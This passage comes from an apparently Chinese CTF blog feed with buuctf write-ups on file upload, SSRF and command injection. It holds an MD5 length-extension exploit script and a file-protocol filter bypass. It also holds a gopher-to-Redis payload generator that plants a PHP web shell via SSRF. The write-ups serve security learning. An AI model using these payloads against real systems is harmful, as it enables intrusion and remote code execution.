$instance;</span><br><span class="line">    <span class="keyword">public</span> $arg1;</span><br><span class="line">    <span class="keyword">public</span> $arg2;</span><br><span class="line">    <span class="keyword">public</span> $arg3;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;clazz = $clazz;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func1 = $func1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func2 = $func2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func3 = $func3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg1 = $arg1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg2 = $arg2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin&#x27;</span>]))&#123;</span><br><span class="line">        $cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[<span class="string">&#x27;clazz&#x27;</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">&#x27;func1&#x27;</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">&#x27;func2&#x27;</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">&#x27;func3&#x27;</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">&#x27;arg1&#x27;</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">&#x27;arg2&#x27;</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">&#x27;arg3&#x27;</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You r not admin!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TODO">TODO</h3><h2 id="HarekazeCTF2019-Avatar-Uploader-2">HarekazeCTF2019 Avatar Uploader 2</h2><h3 id="TODO-v2">TODO</h3><h2 id="D3CTF-2019-EzUpload">D3CTF 2019 EzUpload</h2><h3 id="TODO-v3">TODO</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;极客大挑战-2019-Upload&quot;&gt;极客大挑战 2019 Upload&lt;/h2&gt;
&lt;h3 id=&quot;考点&quot;&gt;考点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;phtml绕过后缀&lt;/li&gt;
&lt;li&gt;script绕过&amp;lt;?&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;解题&quot;&gt;解题&lt;/h
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="文件上传" scheme="http://ca0y1h.top/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题——SSRF</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF/</id>
    <published>2020-08-18T09:58:58.000Z</published>
    <updated>2020-08-18T12:24:47.954Z</updated>
    
    <content type="html"><![CDATA[<h2 id="De1CTF2019-SSRF-Me">De1CTF2019 SSRF Me</h2><h3 id="考点">考点</h3><ul><li>Python代码审计</li><li>MD5扩展攻击</li></ul><h3 id="解题">解题</h3><p>首先看三个路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure><ol><li>/：首页，获取源码；</li><li>/geneSign：从用户获取<code>param</code>参数，再结合预设的<code>action='scan'</code>调用<code>getSign</code>生成签名；</li><li>/De1ta：从cookie中获取<code>action</code>和<code>sign</code>，再获取<code>param</code>参数，结合当前IP地址构造一个Task类，最后以json的格式返回<code>Exec</code>方法执行结果。</li></ol><p>再来看getSign函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>将 secert_key 和 param 和 action 拼在一起，对其md5签名。secert_key是随机生成的16个字节的字符串。</p><p>然后来看waf函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>禁止param参数以<code>gopher</code>和<code>file</code>开头。</p><p>再来看到 Task 类的 Exec 方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> self.checkSign():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> resp == <span class="string">&quot;Connection Timeout&quot;</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>首先验证签名，如果是<code>scan</code>类型就调用 scan 方法来读取内容并写到沙盒下的 <code>result.txt</code> 文件。如果是<code>read</code>类型就读取沙盒中的<code>result.txt</code>内容。</p><p>那我们的思路就是：</p><ul><li>读取 flag.txt 到 result.txt。</li><li>展示 result.txt 的内容。</li></ul><h4 id="方法一">方法一</h4><p>预期解法：哈希长度拓展攻击+CVE-2019-9948(urllib)</p><p>简单来说MD5扩展长度攻击的原理：</p><blockquote><p><a href="https://www.jianshu.com/p/241e772a513f">https://www.jianshu.com/p/241e772a513f</a></p></blockquote><blockquote><p>当已知以下三点</p><ul><li>md5(salt+message)的值</li><li>message内容</li><li>salt+message长度</li></ul><p>我们可以在不知道salt的具体内容的情况下，计算出任意的md5(salt+message+padding+append)值</p></blockquote><p>urlopen有两种办法可以读取到本地文件。</p><ul><li>直接写文件名，前面啥都别带。</li><li>local_file: ,参考 <a href="https://bugs.python.org/issue35907">https://bugs.python.org/issue35907</a></li></ul><p>Python脚本exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://34b95521-f528-44e1-bcf5-b55918e71fc1.node3.buuoj.cn/&#x27;</span></span><br><span class="line">param = <span class="string">&#x27;flag.txt&#x27;</span></span><br><span class="line">r = requests.get(url + <span class="string">&#x27;getSign&#x27;</span>, params=&#123;<span class="string">&#x27;param&#x27;</span>: param&#125;)</span><br><span class="line">sign = r.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate sign</span></span><br><span class="line">hash_sign = hashpumpy.hashpump(sign, param + <span class="string">&#x27;scan&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(url + <span class="string">&#x27;De1ta&#x27;</span>, params=&#123;<span class="string">&#x27;param&#x27;</span>: param&#125;, cookies=&#123;</span><br><span class="line">    <span class="string">&#x27;sign&#x27;</span>: hash_sign[<span class="number">0</span>],</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: urllib.parse.quote(hash_sign[<span class="number">1</span>][len(url):])</span><br><span class="line">&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h4 id="方法二">方法二</h4><p>要想进入对action判断的部分，比如先验证签名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><ol><li>在<code>checkSign()</code>函数的比较中，左边是<code>getSign(self.action, self.param)</code>，右边是<code>getSign('scan', param)</code>（因为在访问geneSign页面时，是自动传入<code>scan</code>参数）。</li><li>如果再写深一点，左边是<code>md5(key + self.param + self.action)</code>，考虑到要读取<code>flag.txt</code>文件，我们可以写成<code>md5(key + 'flag.txt' + self.action)</code>。</li><li>为了保证Exec()函数中scan部分和read部分都能被执行，<code>self.action</code>必须有<code>readscan</code>或<code>scanread</code>这样的字符串（注意：源码中用<code>in</code>操作符而不是用<code>==</code>）。</li><li>等号右边是<code>md5(key + param + 'scan')</code>，所以可以将等号左边的<code>self.action</code>定为<code>readscan</code>。</li><li>这样一来，等号左边为<code>md5(key + 'flag.txt' + 'readscan')</code>，现在就剩下等号右边的<code>param</code>参数没有确定，那么为了验证通过，我们可以将<code>param=flag.txtread</code>传参。</li><li>最后也就等价于<code>md5(key + 'flag.txt' + 'readscan') == md5(key + 'flag.txtread' + 'scan') </code></li></ol><p>payload1</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620230158.png" alt=""></p><p>payload2</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620230222.png" alt=""></p><h2 id="GKCTF2020-Ezweb">GKCTF2020 Ezweb</h2><p>打开题目查看源代码</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711220548.png" alt=""></p><p>添加一下<code>?secret</code>参数，返回了<code>ifconfig</code>命令的结果</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711220700.png" alt=""></p><p>应该是SSRF漏洞利用了，先尝试用file协议读文件，发现被ban掉了，用<code>file:/</code>或者<code>file: ///</code>绕过：</p><p>payload：<code>file: ///var/www/html/index.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711220855.png" alt=""></p><p>审计一下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//var_dump($match);</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;别这样&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源码中可知过滤了file协议、dict协议、127.0.0.1和localhost，但没有过滤http协议和gopher协议。</p><p>既然给了内网地址，那么先http协议探测一下内网主机存活，直接上工具Fuzz：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711225350.png" alt=""></p><p>11端口的回显给了一个hint</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711225429.png" alt=""></p><p>接着用http协议去Fuzz这个主机的端口</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711234135.png" alt=""></p><p>发现了运行着Redis服务，直接用下面这个<a href="https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/#Redis4-x-5-x%E4%BB%8ESSRF%E5%88%B0RCE">脚本</a>生成payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.10.238.11&quot;</span>      // 运行有redis的主机ip</span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line"> <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line"> <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line"> <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line"> <span class="string">&quot;save&quot;</span></span><br><span class="line"> ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">cmd+=CRLF</span><br><span class="line"><span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">payload += urllib.quote(redis_format(x))</span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711235713.png" alt=""></p><p>生成Payload后直接放在输入框中打过去，再输入<code>http://173.10.238.11/shell.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711235812.png" alt=""></p><h2 id="HITCON-2017-SSRFme">HITCON 2017 SSRFme</h2><h3 id="TODO">TODO</h3><h2 id="网鼎杯-2018-Fakebook">网鼎杯 2018 Fakebook</h2><h3 id="TODO-v2">TODO</h3><h2 id="网鼎杯-2020-玄武组-SSRFMe">网鼎杯 2020 玄武组 SSRFMe</h2><h3 id="TODO-v3">TODO</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;De1CTF2019-SSRF-Me&quot;&gt;De1CTF2019 SSRF Me&lt;/h2&gt;
&lt;h3 id=&quot;考点&quot;&gt;考点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Python代码审计&lt;/li&gt;
&lt;li&gt;MD5扩展攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;解题&quot;&gt;解题&lt;/h3&gt;

      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="SSRF" scheme="http://ca0y1h.top/categories/CTF/SSRF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题——XSS</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS/</id>
    <published>2020-08-18T09:58:47.000Z</published>
    <updated>2020-08-18T10:54:06.093Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-华东北赛区-Web2">[CISCN2019 华东北赛区]Web2</h2><h2 id="CISCN2019-华东南赛区-Web9">[CISCN2019 华东南赛区]Web9</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CISCN2019-华东北赛区-Web2&quot;&gt;[CISCN2019 华东北赛区]Web2&lt;/h2&gt;
&lt;h2 id=&quot;CISCN2019-华东南赛区-Web9&quot;&gt;[CISCN2019 华东南赛区]Web9&lt;/h2&gt;

      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="XSS" scheme="http://ca0y1h.top/categories/CTF/XSS/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题——命令执行</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2020-08-18T09:58:31.000Z</published>
    <updated>2020-08-18T12:29:36.430Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping">GXYCTF2019 Ping Ping Ping</h2><h3 id="TODO">TODO</h3><h2 id="ACTF2020-新生赛-Exec">ACTF2020 新生赛 Exec</h2><h3 id="TODO-v2">TODO</h3><h2 id="BUUCTF2018-Online-Tool">BUUCTF2018 Online Tool</h2><h3 id="考点">考点</h3><ul><li>Nmap参数注入</li></ul><h3 id="解题">解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span 